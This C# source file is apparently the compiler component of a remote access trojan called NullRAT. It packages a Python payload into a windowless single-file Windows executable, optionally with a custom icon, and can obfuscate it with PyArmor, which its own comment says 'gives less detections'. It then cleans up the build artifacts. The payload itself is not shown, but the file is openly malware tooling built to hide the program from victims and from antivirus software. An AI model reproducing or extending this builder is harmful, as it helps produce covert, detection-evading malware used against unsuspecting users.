namespace NullRAT.Compiler
{
    internal class MakeRAT
    {
        /// <summary>
        /// Compile NullRAT!
        /// </summary>
        /// <param name="obfuscate">if true the RAT executable will be obfuscated.</param>
        /// <remarks>Compiling with obfuscation gives less detections.</remarks>
        public static void CompileRAT(bool customIcon, bool obfuscate = true)
        {
            string ObfuscateArguments,
               NotObfuscatedArguments;

            CmdOutput consoleOutput = new();

            if (customIcon)
            {
                ObfuscateArguments = $"pack --clean -e \"--onefile --icon='{Environment.CurrentDirectory}\\src\\custom_icon.ico' --noconsole\" \"{Environment.CurrentDirectory}\\src\\RAT.py\"";
                NotObfuscatedArguments = $"--onefile --icon='{Environment.CurrentDirectory}\\src\\custom_icon.ico' --noconsole \"{Environment.CurrentDirectory}\\src\\RAT.py\"";
            } 
            else
            {
                ObfuscateArguments = $"pack --clean -e \"--onefile --noconsole\" \"{Environment.CurrentDirectory}\\src\\RAT.py\"";
                NotObfuscatedArguments = $"--onefile --noconsole \"{Environment.CurrentDirectory}\\src\\RAT.py\"";
            }

            if (obfuscate) 
            {
                //Create obfuscated RAT.py -> MUST execute on shell, avoids infinite compilation
                consoleOutput = ProcessInvoker.RunCmd("pyarmor", ObfuscateArguments, true);
            }
            else
            {
                consoleOutput = ProcessInvoker.RunCmd("pyinstaller", NotObfuscatedArguments, true);

            }

            if (consoleOutput.ExitCode == 0 && obfuscate)
            {
                //Move obfuscated RAT.
                File.Move(Environment.CurrentDirectory + @"\src\dist\RAT.exe", Environment.CurrentDirectory + @"\RAT.exe", true);

                //Delete temporal building folders resultant of the RAT obfuscated build
                Directory.Delete(Environment.CurrentDirectory + @"\temp\", true);
                Directory.Delete(Environment.CurrentDirectory + @"\build\", true);
                Directory.Delete(Environment.CurrentDirectory + @"\src\dist\", true);
                //Delete RAT.spec && RAT-patched.spec
                File.Delete(Environment.CurrentDirectory + @"\RAT.spec");
                File.Delete(Environment.CurrentDirectory + @"\RAT-patched.spec");
            } 
            else if(consoleOutput.ExitCode == 0 && !obfuscate)
            {
                //Move non-obfuscated RAT.
                File.Move(Environment.CurrentDirectory + @"\dist\RAT.exe", Environment.CurrentDirectory + @"\RAT.exe", true);

                //Delete temporal building folders resultant of the RAT non-obfuscated build
                Directory.Delete(Environment.CurrentDirectory + @"\temp\", true);
                Directory.Delete(Environment.CurrentDirectory + @"\dist\", true);
                Directory.Delete(Environment.CurrentDirectory + @"\build\", true);
                Directory.Delete(Environment.CurrentDirectory + @"\src\__pycache__\", true);

                //Delete RAT.spec
                File.Delete(Environment.CurrentDirectory + @"\RAT.spec");
            }
        }
    }
}
